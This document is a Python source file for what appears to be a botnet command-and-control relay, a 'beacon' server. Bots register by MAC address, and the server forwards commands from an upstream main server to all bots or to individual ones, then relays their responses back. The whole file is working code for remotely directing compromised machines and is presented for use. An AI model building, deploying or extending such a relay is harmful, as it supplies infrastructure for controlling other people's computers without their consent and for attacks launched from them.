import queue
import socket
import threading
import time
import json

from core import logger
from collections import OrderedDict

logger = logger.get_logger(__name__)

SERVER_HOST = 'localhost'
SERVER_PORT = 5000

server_coms_lock = threading.Lock()

class Beacon(object):
    def __init__(self, host, port):
        logger.debug("Created Beacon object")
        self.host = host
        self.port = port
        self.proxy_queue = queue.Queue()
        self.message_queues = OrderedDict({'all': queue.Queue()})
        self.mac2addr = OrderedDict()

    def start(self):
        beacon = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        beacon_address = (self.host, self.port)
        beacon.bind(beacon_address)
        beacon.listen()

        logger.debug("Started beacon server on tcp://{0}:{1}".format(self.host, self.port))
        print("[+] Started beacon server on tcp://{0}:{1}".format(self.host, self.port))

        main_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            main_server.connect((SERVER_HOST, SERVER_PORT))
            logger.debug("Connected to main server {0}:{1}".format(SERVER_HOST, SERVER_PORT))
            server_proxy_thread = ServerProxyThread(main_server, self.message_queues, self.proxy_queue, self.mac2addr)
            server_proxy_thread.start()
        except socket.error as exc:
            print(exc)
            logger.error("Couldn't connect to main server {0};{1} : {2}".format(SERVER_HOST, SERVER_PORT, exc))
            exit(1)  
        
        while True:
            conn, addr = beacon.accept()
            self.message_queues[addr] = queue.Queue()
            slave_thread = SlaveThread(conn, addr, self.message_queues, self.proxy_queue, self.mac2addr) 
            slave_thread.start()


class ServerProxyThread(threading.Thread):
    def __init__(self, conn, mqs, pq, mac2addr):
        threading.Thread.__init__(self)
        self.conn = conn
        self.proxy_queue = pq
        self.message_queues = mqs
        self.mac2addr = mac2addr
        self.conn.setblocking(0)

    def number_of_bots(self):
        return len(self.mac2addr.keys())

    def run(self):
        name = threading.current_thread().getName()

        logger.debug("Running Server Proxy: Thread-ID: {0}".format(name))

        while True:
            # Check if there is something to send
            try:
                response = self.proxy_queue.get(block=False)
                logger.debug("Server Proxy Thread: Got message from proxy queue: {0}".format(response))
                self.conn.sendall(response.encode("utf-8"))
            except queue.Empty:
                pass
        
            # Check if there is something to receive and put to the queue for forwarding to bots
            try:
                message = self.conn.recv(1024).decode("utf-8")
                logger.debug("Server Proxy Thread: Received message from main server: '{0}'".format(message))
                if message is not "":
                    message = json.loads(message)
                    if message["to"] == "all":
                        # Handle multi-cast
                        logger.debug("Server Proxy Thread: Adding message to messages_queue with topic: 'all'")
                        for _ in range(self.number_of_bots()):
                            self.message_queues["all"].put(message)
                    else:
                        bot_addr = self.mac2addr[message["to"]]
                        logger.debug("Server Proxy Thread: Adding message to messages_queue with topic: {0}".format(bot_addr))
                        self.message_queues[bot_addr].put(message)
            except socket.error:
                pass
            except json.decoder.JSONDecodeError:
                logger.debug("Server Proxy Thread: Received message could not be decoded as JSON: {0}".format(message))
            time.sleep(0.1)
        
class SlaveThread(threading.Thread):
    def __init__(self, slave_conn, bot_addr, mqs, pq, mac2addr):
        threading.Thread.__init__(self)
        self.slave_conn = slave_conn
        self.proxy_queue = pq
        self.bot_addr = bot_addr
        self.ip = bot_addr[0]
        self.port = bot_addr[1]
        self.message_queues = mqs
        self.mac2addr = mac2addr
        self.subscribed_topics = ["all", bot_addr]
        self.slave_conn.setblocking(0)

    def run(self):
        name = threading.current_thread().getName()

        logger.debug("Running Thread: Slave  {0}:{1} connected".format(self.ip, str(self.port)))
        print("[*] Slave {0}:{1} connected".format(self.ip, str(self.port)))
        
        while True:
            ## Check if there is something to receive
            try:
                command = self.slave_conn.recv(1024).decode('utf-8')
                if command is not "":
                    logger.debug("Slave  {0}:{1} command received: {2}".format(self.ip, str(self.port), command))
                    ## Attempt to decode message and register bot if it's a new mac
                    command_json = json.loads(command)
                    if "type" in command_json and command_json["type"] == "new":
                        logger.debug("Slave {0}:{1} Created new mapping to {2}".format(self.ip, str(self.port), command_json["mac"]))
                        self.mac2addr[command_json["mac"]] = self.bot_addr
                        # Unmarshal and add slave's address
                        command_json['slave'] = {'ip': self.ip, 'port': self.port}
                        # Marshal back
                        command = json.dumps(command_json)
                    self.proxy_queue.put(command)
            except socket.error as e:
                pass
            except json.decoder.JSONDecodeError:
                pass

            ## Check if there is anything to forward
            for topic in self.subscribed_topics:
                try:
                    message = self.message_queues[topic].get(block=False)
                except queue.Empty:
                    continue

                logger.debug("Slave {0} received command: \"{1}\",  on subscribed topic: \"{2}\"".format(name, message, topic))
                try:
                    logger.debug("Slave {0} sending command: {1}".format(name, message))
                    self.slave_conn.send(json.dumps(message).encode('utf-8'))
                except Exception as ex:
                    is_success = False
                    logger.error("Slave {0}: sending command failed: {1}:".format(name, ex))
                    print(ex)
            time.sleep(0.1)

if __name__=="__main__":
    logger.debug("Launched beacon Python script")
    beacon = Beacon("0.0.0.0", 5002)
    beacon.start()